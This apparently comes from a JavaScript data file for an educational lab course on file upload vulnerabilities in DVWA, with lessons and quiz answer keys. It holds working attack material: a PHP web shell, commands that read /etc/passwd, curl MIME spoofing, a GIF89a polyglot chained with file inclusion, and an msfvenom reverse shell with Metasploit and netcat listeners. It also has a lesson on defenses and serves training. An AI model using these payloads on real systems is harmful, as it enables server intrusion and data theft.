const LESSONS = [
  {
    title: "1. Start Here — Set Up the Lab",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL: Get both machines running and log into DVWA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️  This lab is for EDUCATION ONLY. Only attack the DVWA lab machine inside this page. Never use these techniques on real websites.

━━━━━ STEP 1 — Launch DVWA (Your Target) ━━━━━
👆 Look at the red box above that says "🎯 DVWA Target Server"
   Click the button: [Open DVWA Target ⇗]
   → A new browser tab will open with DVWA running.
   → If it says "Cannot connect" wait 10 seconds and refresh.

━━━━━ STEP 2 — Set Up the DVWA Database ━━━━━
In the DVWA tab that just opened:
   1. Look at the left sidebar menu
   2. Click → "Setup / Reset DB"
   3. Scroll down and click the big button: [Create / Reset Database]
   4. Wait for the green success message
   5. DVWA will reload — that is normal!

━━━━━ STEP 3 — Log Into DVWA ━━━━━
After the page reloads you will see a login screen:
   Username: admin
   Password: password
   → Click [Login]

━━━━━ STEP 4 — Set Security Level to LOW ━━━━━
This is very important — do this BEFORE anything else!
   1. In the left sidebar click → "DVWA Security"
   2. You will see a dropdown. Change it from "Impossible" to → "Low"
   3. Click [Submit]
   4. The page will say "Security level set to low" ✅

━━━━━ STEP 5 — Launch Kali (Your Attack Machine) ━━━━━
👆 Look at the red box above that says "🐉 Kali Linux Environment"
   Click the button: [Start Kali Container ⇗]
   → Wait about 15 seconds
   → A command will appear in a black box below the button
   → Copy that command and paste it in YOUR computer's terminal (not DVWA)
   → That gives you a Kali Linux command line!

━━━━━ ✅ YOU ARE READY! ━━━━━
Both machines are now running:
  • DVWA tab = the website you will attack
  • Kali terminal = your attack machine`,
    questions: [
      { q: "What username do you use to log into DVWA?", a: "admin" },
      { q: "What security level must DVWA be set to for Lesson 4 (basic upload)?", a: "low" },
      { q: "After clicking 'Create / Reset Database', what should you see?", a: "success" }
    ]
  },
  {
    title: "2. What is a File Upload Vulnerability?",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 CONCEPT: Understanding the Attack
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Imagine this: A website says "Upload your profile picture here 📷"
Most people upload a harmless image like photo.jpg.

BUT — what if you upload a PHP file instead?
If the website saves it and lets you visit it via a URL,
your PHP code RUNS on the server.

That is a File Upload Vulnerability.

━━━━━ WHY IS THIS BAD? ━━━━━
When an attacker's code runs on a server it is called:
   Remote Code Execution (RCE)

With RCE an attacker can:
   • Read every file on the server (databases, passwords)
   • Delete files
   • Install a permanent backdoor
   • Take full control of the server

━━━━━ KEY WORDS (remember these!) ━━━━━

Web Shell
   A PHP file you upload that lets you type commands.
   Example: visit shell.php?cmd=whoami → server runs whoami for you.

Upload Directory
   The folder where uploaded files are saved on the server.
   In DVWA it is: /var/www/html/dvwa/hackable/uploads/
   Files here are reachable via URL, so PHP inside them can execute.

Webroot
   The base folder the web server serves to the internet.
   Anything inside the webroot can be visited via a URL.

━━━━━ THE SIMPLE ATTACK FLOW ━━━━━
   1. Attacker creates a PHP file (web shell)
   2. Attacker uploads it through the upload form
   3. Server saves it in the uploads folder (inside webroot)
   4. Attacker visits the URL of the uploaded file
   5. PHP executes → attacker runs commands on the server! 💀`,
    questions: [
      { q: "What is it called when an attacker runs code on a remote server?", a: "Remote Code Execution" },
      { q: "What do we call a PHP script uploaded to run OS commands via a URL?", a: "web shell" },
      { q: "In DVWA, what is the name of the folder where uploaded files are stored?", a: "hackable/uploads" }
    ]
  },
  {
    title: "3. Linux Commands You Will Use",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️  LEARN: Linux commands for the attack
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Once your PHP shell is uploaded, you send commands through it via a URL.
Here are the commands you will use and what they do:

━━━━━ COMMAND: whoami ━━━━━
   What it does: Shows which user the web server is running as
   URL to use:   shell.php?cmd=whoami
   Expected output: www-data
   (www-data is a low-privilege Linux user Apache runs as)

━━━━━ COMMAND: id ━━━━━
   What it does: Shows user ID, group ID, and all groups
   URL to use:   shell.php?cmd=id
   Expected output: uid=33(www-data) gid=33(www-data)

━━━━━ COMMAND: ls ━━━━━
   What it does: Lists all files in the current folder
   URL to use:   shell.php?cmd=ls
   Or list a specific folder: shell.php?cmd=ls+/var/www/html

━━━━━ COMMAND: pwd ━━━━━
   What it does: Shows which folder you are currently in
   URL to use:   shell.php?cmd=pwd
   Expected output: /var/www/html/dvwa/hackable/uploads

━━━━━ COMMAND: cat ━━━━━
   What it does: Reads and prints the contents of a file
   URL to use:   shell.php?cmd=cat+/etc/passwd
   This reads the password file on the server!

━━━━━ HOW TO RUN COMMANDS ━━━━━
In the URL bar, replace the IP and type your command after ?cmd=
   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=COMMAND_HERE

Use + instead of spaces in the URL:
   ?cmd=ls+/var/www     means: ls /var/www`,
    questions: [
      { q: "Which command shows what OS user the web server is running as?", a: "whoami" },
      { q: "Which command lists files in the current directory?", a: "ls" },
      { q: "In a URL, what character replaces a space in the cmd parameter?", a: "+" }
    ]
  },
  {
    title: "4. DVWA Low — Upload Your First Shell",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔴 PRACTICAL ATTACK — DVWA Security: LOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

On Low security, DVWA accepts ANY file — no checks at all.
This is the most basic (and dangerous) real-world misconfiguration.


━━━━━ STEP 1 — Create the Web Shell File ━━━━━
Open your Kali terminal and type this command exactly:
┌──────────────────────────────────────────────┐
│  cat > shell.php << 'EOF'                    │
│  <?php                                       │
│  if(isset($_REQUEST['cmd'])){                │
│    echo "<pre>" .                            │
│         shell_exec($_REQUEST['cmd']) .        │
│         "</pre>";                            │
│  }                                           │
│  ?>                                          │
│  EOF                                         │
└──────────────────────────────────────────────┘
✅ This creates a file called "shell.php".

Code Breakdown (line by line):
─────────────────────────────
  Line 1: <?php
    → Tells the server "this is PHP code, execute it"

  Line 2: if(isset($_REQUEST['cmd']))
    → Checks: "Did the URL contain ?cmd=something?"
    → $_REQUEST reads values from the URL parameters

  Line 3: shell_exec($_REQUEST['cmd'])
    → Takes whatever you typed after ?cmd= and runs
      it as a real Linux command on the server!
    → This is the dangerous part — the server obeys
      any command you send.

  Line 4: echo "<pre>" ... "</pre>"
    → Wraps the command output in <pre> tags so it
      displays neatly in the browser (like a terminal)


━━━━━ STEP 2 — Open the File Upload Page ━━━━━
In the DVWA browser tab:
  → Left sidebar → click "File Upload"
  → You will see a [Choose File] button and [Upload]


━━━━━ STEP 3 — Upload the Shell ━━━━━
  1. Click [Choose File]
  2. Find and select shell.php from your Kali home folder
  3. Click [Upload]
  4. Look for the success message:
     "../../hackable/uploads/shell.php succesfully uploaded!"


━━━━━ STEP 4 — Execute Your First Command! ━━━━━
In your browser address bar, visit this URL:
┌──────────────────────────────────────────────┐
│  http://[DVWA-IP]/dvwa/hackable/uploads/     │
│  shell.php?cmd=whoami                        │
└──────────────────────────────────────────────┘
(Replace [DVWA-IP] with your actual DVWA address)

  Expected output:  www-data
  (This is the Linux user Apache runs as)

Try these other commands:
┌──────────────┬───────────────────────────────┐
│  ?cmd=id     │  Shows user/group IDs         │
│  ?cmd=ls     │  Lists files in current dir   │
│  ?cmd=pwd    │  Shows current directory path │
│  ?cmd=cat+/etc/passwd  │  Reads the password  │
│              │  file on the server!          │
└──────────────┴───────────────────────────────┘

━━━━━ 🎉 YOU HAVE RCE! ━━━━━
You are running Linux commands on a remote server
through nothing but a web browser URL bar!`,
    questions: [
      { q: "What PHP function runs an OS command and returns its output?", a: "shell_exec" },
      { q: "After uploading shell.php on Low, which folder is it saved in?", a: "hackable/uploads" },
      { q: "What URL parameter sends commands to the web shell?", a: "cmd" }
    ]
  },
  {
    title: "5. How Servers Check Files (MIME & Magic Bytes)",
    points: 10,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📖 THEORY: How does the server decide if a file is safe?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Servers use different methods to check uploaded files.
Knowing which method a server uses tells you how to bypass it.

━━━━━ METHOD 1 — Check the MIME Type Header ━━━━━
When your browser uploads a file it sends a Content-Type header.
Example: Content-Type: image/jpeg

PROBLEM: The attacker controls this header. It can be faked easily!
This is what DVWA Medium checks — and it can be bypassed.

Common MIME types:
   image/jpeg   → .jpg file
   image/png    → .png file
   image/gif    → .gif file
   text/plain   → .txt file

━━━━━ METHOD 2 — Check the File Extension ━━━━━
Server looks at the end of the filename: shell.php → extension is .php

Bypass tricks:
   • shell.php.jpg   (rename to look like image)
   • shell.phtml     (alternate PHP extension)
   • shell.php5      (alternate PHP extension)
   • shell.php%00.jpg (null byte, old PHP only)

━━━━━ METHOD 3 — Check Magic Bytes ━━━━━
Every real file format starts with specific bytes.
Example: A GIF file always starts with the letters: GIF89a

PHP function getimagesize() reads these bytes.
If the file starts with GIF89a it says "this is a GIF image ✅"

BYPASS: Start your PHP file with GIF89a before the PHP code!
getimagesize() sees the header → passes.
PHP interpreter sees the <?php code → executes it!

   GIF89a<?php system($_GET['cmd']); ?>

━━━━━ WHICH LEVEL USES WHICH CHECK? ━━━━━
   Low      → No check at all
   Medium   → Checks MIME type header (easy to fake)
   High     → Checks magic bytes with getimagesize()`,
    questions: [
      { q: "What HTTP header tells the server what type of file is being uploaded?", a: "Content-Type" },
      { q: "What 6 characters do you prepend to trick getimagesize() into thinking a file is a GIF?", a: "GIF89a" },
      { q: "What are the specific bytes at the start of a file that identify its real type called?", a: "magic bytes" }
    ]
  },
  {
    title: "6. DVWA Medium — Bypass the MIME Check",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟡 PRACTICAL ATTACK — DVWA Security: MEDIUM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

On Medium, the server checks the Content-Type header.
If it doesn't say "image/jpeg" or "image/png", the
upload is rejected. Uploading shell.php directly FAILS.

But here's the trick: YOUR browser sends that header.
You control it. We can LIE and say "this is a JPEG"
while the file is actually PHP code.


━━━━━ STEP 1 — Change DVWA to Medium ━━━━━
In the DVWA tab:
  → Left sidebar → "DVWA Security"
  → Change to "Medium" → Click [Submit]


━━━━━ STEP 2 — Get Your Session Cookie ━━━━━
We'll use curl (command-line tool) to upload.
curl needs your login cookie to authenticate.

How to find your PHPSESSID:
  1. In Chrome/Firefox, press F12 (Developer Tools)
  2. Click the "Application" tab (Chrome) or
     "Storage" tab (Firefox)
  3. Expand "Cookies" → click the DVWA URL
  4. Find the row named "PHPSESSID"
  5. Copy the Value (looks like: abc123def456...)


━━━━━ STEP 3 — Upload with MIME Spoofing ━━━━━
In your Kali terminal, run this command:
(Replace SESSION_VALUE with your actual PHPSESSID)
┌──────────────────────────────────────────────┐
│  curl -v \                                   │
│    -b "security=medium;                      │
│        PHPSESSID=SESSION_VALUE" \            │
│    -F "uploaded=@shell.php;                  │
│        type=image/jpeg" \                    │
│    -F "Upload=Upload" \                      │
│    http://[DVWA-IP]/dvwa/vulnerabilities/    │
│    upload/                                   │
└──────────────────────────────────────────────┘

What each flag does:
┌──────────────┬───────────────────────────────┐
│  -v          │ Verbose mode — shows the full │
│              │ HTTP request/response headers  │
├──────────────┼───────────────────────────────┤
│  -b "..."    │ Sends your cookies so DVWA    │
│              │ knows you are logged in        │
├──────────────┼───────────────────────────────┤
│  -F "uploaded│ Uploads shell.php BUT sets    │
│  =@shell.php;│ Content-Type to image/jpeg    │
│  type=image/ │ → This is the LIE that tricks │
│  jpeg"       │   the server!                 │
├──────────────┼───────────────────────────────┤
│  -F "Upload= │ Simulates clicking the Upload │
│  Upload"     │ button on the web form        │
└──────────────┴───────────────────────────────┘


━━━━━ STEP 4 — Verify Upload Success ━━━━━
In the curl output, look for the success message:
  "../../hackable/uploads/shell.php succesfully uploaded!"


━━━━━ STEP 5 — Execute Commands ━━━━━
Same as Lesson 4 — visit in your browser:
  http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=id


━━━━━ WHY THIS BYPASS WORKS ━━━━━
The server's Medium-level check:
  ✗ Reads the Content-Type HTTP header
  ✗ Compares it against "image/jpeg" or "image/png"
  ✓ If it matches → allows the upload

The problem: The Content-Type header is sent by YOUR
browser/tool. You can set it to anything you want!
The server blindly trusts the header without checking
the actual file content. The file is still pure PHP.`,
    questions: [
      { q: "What is it called when you fake the Content-Type header to bypass file type checks?", a: "MIME spoofing" },
      { q: "In the curl command, which part sets the fake MIME type?", a: "type=image/jpeg" },
      { q: "Where do you find your PHPSESSID cookie value?", a: "developer tools" }
    ]
  },
  {
    title: "7. DVWA High — Bypass Magic Byte Check",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔴 PRACTICAL ATTACK — DVWA Security: HIGH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

High level is much harder. The server now uses
getimagesize() — a PHP function that reads the ACTUAL
BYTES of the file to verify it's a real image.

Faking the Content-Type header (like Medium) won't work.
We need a completely different strategy: make our PHP
code LOOK like an image at the byte level.


━━━━━ STEP 1 — Change DVWA to High ━━━━━
In the DVWA tab:
  → Left sidebar → "DVWA Security"
  → Change to "High" → Click [Submit]


━━━━━ STEP 2 — Create a Polyglot Payload ━━━━━
"Polyglot" means a file that is valid in TWO formats:
it looks like a GIF image AND contains PHP code.

In your Kali terminal, run:
┌──────────────────────────────────────────────┐
│  printf 'GIF89a<?php system(                 │
│    $_GET["cmd"]); ?>' > evil.gif             │
└──────────────────────────────────────────────┘

How this file is structured:
┌──────────┬───────────────────────────────────┐
│ Byte 1-6 │ GIF89a                            │
│          │ → The "magic bytes" that identify │
│          │   a GIF image. getimagesize()     │
│          │   reads these first and says:     │
│          │   "Yes! This is a real GIF ✅"     │
├──────────┼───────────────────────────────────┤
│ Byte 7+  │ <?php system($_GET["cmd"]); ?>    │
│          │ → PHP code hidden AFTER the GIF   │
│          │   header. The image check ignores │
│          │   everything after the header.    │
│          │   But PHP will execute it!        │
└──────────┴───────────────────────────────────┘


━━━━━ STEP 3 — Upload evil.gif ━━━━━
In DVWA:
  → Left sidebar → "File Upload"
  → Click [Choose File] → select evil.gif
  → Click [Upload]
  → You should see: "succesfully uploaded!" ✅

⚠️ BUT THERE'S A CATCH:
High also blocks .php extensions! The file is saved
as evil.gif (not .php). Apache will NOT auto-execute
a .gif file. We can't just visit the URL like before.

So how do we run our PHP code? We chain it with
ANOTHER vulnerability...


━━━━━ STEP 4 — Chain with File Inclusion (LFI) ━━━━━
DVWA has a "File Inclusion" vulnerability. It lets us
tell the server: "include and execute THIS file as PHP."

We point it at our uploaded evil.gif!

In DVWA:
  → Left sidebar → "File Inclusion"
  → Look at the URL bar — you'll see: ?page=include.php
  → Replace "include.php" with the path to evil.gif

⚠️ On High, File Inclusion only accepts paths starting
with "file". Use the file:// wrapper to bypass this:
┌──────────────────────────────────────────────┐
│  http://[DVWA-IP]/dvwa/vulnerabilities/fi/   │
│  ?page=file:///var/www/html/dvwa/hackable/   │
│  uploads/evil.gif&cmd=id                     │
└──────────────────────────────────────────────┘

If File Inclusion is set to Low/Medium, this also works:
  ?page=../../hackable/uploads/evil.gif&cmd=id


━━━━━ WHAT HAPPENS WHEN YOU VISIT THAT URL ━━━━━
  1. PHP's include() opens evil.gif
  2. It sees GIF89a (just treats it as text output)
  3. It finds <?php system(...) ?> → EXECUTES IT!
  4. &cmd=id is passed to system()
  5. Output: uid=33(www-data) 🎉


━━━━━ WHY THIS WORKS ━━━━━
We chained TWO vulnerabilities together:
  ① File Upload  → Got our code onto the server
  ② File Inclusion → Made the server execute it

getimagesize() only checks the first few bytes.
PHP's include() executes ALL PHP tags in ANY file,
regardless of the file extension (.gif, .txt, etc).`,
    questions: [
      { q: "Which PHP function reads file header bytes to validate if it is a real image?", a: "getimagesize" },
      { q: "What 6-character magic bytes do we put at the start of the file to bypass the image check?", a: "GIF89a" },
      { q: "Which second DVWA vulnerability do we use to execute the uploaded .gif as PHP?", a: "File Inclusion" }
    ]
  },
  {
    title: "8. Tool Method — Metasploit Reverse Shell",
    points: 20,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛠️  TOOLS: Automate the attack with Metasploit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

So far we used manual methods. Now let's use Metasploit to get a
full interactive shell — not just single commands.

━━━━━ WHAT IS A REVERSE SHELL? ━━━━━
Instead of you connecting TO the server,
the server connects BACK to your Kali machine.
This bypasses firewalls that block incoming connections.

Flow:
   1. You start a listener on Kali (wait for connections)
   2. Victim server connects back to you
   3. You have a full interactive command line!

━━━━━ STEP 1 — Find Your Kali IP ━━━━━
In your Kali terminal:
   ip addr show eth0 | grep inet

Note the IP address (e.g. 172.17.0.3)
This is YOUR_KALI_IP for the next steps.

━━━━━ STEP 2 — Generate a PHP Reverse Shell ━━━━━
In Kali terminal:
   msfvenom -p php/meterpreter/reverse_tcp \
     LHOST=YOUR_KALI_IP \
     LPORT=4444 \
     -f raw \
     -o payload.php

   -p php/meterpreter/reverse_tcp  → PHP that calls back to us
   LHOST=YOUR_KALI_IP              → Replace with YOUR actual IP!
   LPORT=4444                      → Port we'll listen on
   -o payload.php                  → Save as payload.php

━━━━━ STEP 3 — Start the Metasploit Listener ━━━━━
Open a second terminal window. In Kali run:
   msfconsole -q

Wait for the msf6 > prompt, then type:
   use exploit/multi/handler
   set PAYLOAD php/meterpreter/reverse_tcp
   set LHOST YOUR_KALI_IP
   set LPORT 4444
   exploit

The listener is now waiting for connections.

━━━━━ STEP 4 — Upload and Trigger ━━━━━
Set DVWA back to Low security.
Upload payload.php via File Upload (same as Lesson 4).
Then in a browser visit:
   http://[DVWA-IP]/dvwa/hackable/uploads/payload.php

━━━━━ STEP 5 — Catch the Shell ━━━━━
In your Metasploit terminal you will see:
   [*] Meterpreter session 1 opened

Now type:
   sysinfo      → See server info
   getuid       → See your user (www-data)
   shell        → Drop into a real bash shell
   whoami       → www-data`,
    questions: [
      { q: "What msfvenom flag sets the attacker's listening IP address?", a: "LHOST" },
      { q: "What Metasploit module listens for and handles incoming reverse shell connections?", a: "exploit/multi/handler" },
      { q: "What Meterpreter command drops you into a real system bash shell?", a: "shell" }
    ]
  },
  {
    title: "9. Defenses — How to Stop These Attacks",
    points: 15,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛡️  DEFENSE: How developers should fix file upload
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Now you know how to attack. A good security person also knows
how to defend. Here are the real fixes developers should use:

━━━━━ DEFENSE 1 — Whitelist Extensions (not blacklist) ━━━━━
WRONG WAY (blacklist — easily bypassed):
   if ($ext == "php") { block; }    // Misses .phtml .php5 .phar!

RIGHT WAY (whitelist — only allow known safe types):
   $allowed = ['jpg', 'jpeg', 'png', 'gif'];
   if (!in_array($ext, $allowed)) { die("Not allowed!"); }

━━━━━ DEFENSE 2 — Check Real MIME Type with finfo ━━━━━
Don't trust the browser's Content-Type header — read the file itself:

   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);
   if (!in_array($mime, ['image/jpeg','image/png'])) { die(); }

finfo reads magic bytes from the actual file — cannot be faked by header.

━━━━━ DEFENSE 3 — Rename Files Randomly ━━━━━
Even if a bad file is uploaded, make the URL unpredictable:
   $new_name = bin2hex(random_bytes(16)) . '.jpg';
Attacker cannot guess the URL to trigger the shell.

━━━━━ DEFENSE 4 — Store Files OUTSIDE the Webroot ━━━━━
The webroot is the folder Apache serves to the internet.
Store uploads somewhere Apache does NOT serve:
   /var/uploads/  instead of  /var/www/html/uploads/
Even if shell.php is uploaded, there is no URL to reach it!

━━━━━ DEFENSE 5 — Disable PHP in the Upload Directory ━━━━━
Create a file named .htaccess inside the uploads folder:
   php_flag engine off

This tells Apache: "Never execute PHP files in this folder."
Even if a .php file gets in, it cannot run.

━━━━━ DEFENSE 6 — Scan with Antivirus ━━━━━
Run ClamAV or similar on uploaded files to detect known malware.

━━━━━ WHICH DEFENSE IS STRONGEST? ━━━━━
Storing files outside the webroot is the most powerful.
Even a fully working web shell cannot execute without a URL.`,
    questions: [
      { q: "Which PHP function reads actual file bytes to verify the real MIME type?", a: "finfo_file" },
      { q: "What Apache directive in .htaccess stops PHP execution in a directory?", a: "php_flag engine off" },
      { q: "Why is storing uploads OUTSIDE the webroot the strongest defense?", a: "the file cannot be accessed via URL" }
    ]
  },
  {
    title: "10. Final Quiz — Prove You Know It!",
    points: 15,
    content: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏆 FINAL QUIZ — Answer all questions to complete the lab!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Quick recap before the quiz:

ATTACK FLOW:
   1. Create shell.php (PHP that runs ?cmd= as OS command)
   2. Upload it to DVWA via File Upload page
   3. Visit the uploaded file URL with ?cmd=whoami
   4. Run any command through the browser!

BYPASS METHODS:
   Low    → Direct upload works (no checks)
   Medium → Spoof Content-Type with: type=image/jpeg in curl
   High   → Prepend GIF89a magic bytes, execute via File Inclusion

TOOLS:
   curl       → Upload with spoofed MIME type from terminal
   msfvenom   → Generate reverse shell payloads
   Metasploit → Catch incoming reverse shells
   nc -lvkp 4444 → Simple netcat listener for reverse shells
   nmap       → Discover target IPs and open ports

DEFENSES (the right way):
   ✅ Whitelist extensions (only jpg, png, gif)
   ✅ Validate MIME with finfo_file() (reads actual bytes)
   ✅ Rename uploads to random filenames
   ✅ Store files outside the webroot
   ✅ Add .htaccess with php_flag engine off
   ✅ Scan with antivirus

IMPORTANT COMMANDS TO REMEMBER:
   printf 'GIF89a<?php system($_GET["cmd"]); ?>' > evil.gif
   curl -F 'uploaded=@shell.php;type=image/jpeg' -F 'Upload=Upload' ...
   nc -lvkp 4444
   msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o pay.php

Now answer the questions below to complete the lab! 🎯`,
    questions: [
      { q: "What is the one-word term for running attacker-controlled code on a remote server?", a: "RCE" },
      { q: "What 6-character string bypasses getimagesize() on DVWA High?", a: "GIF89a" },
      { q: "What command starts a simple netcat listener on port 4444?", a: "nc -lvkp 4444" },
      { q: "What is the technique of using both File Upload AND File Inclusion together called?", a: "LFI upload chain" },
      { q: "Which curl flag sets the MIME type of the uploaded file (e.g. to image/jpeg)?", a: "type" }
    ]
  }
];
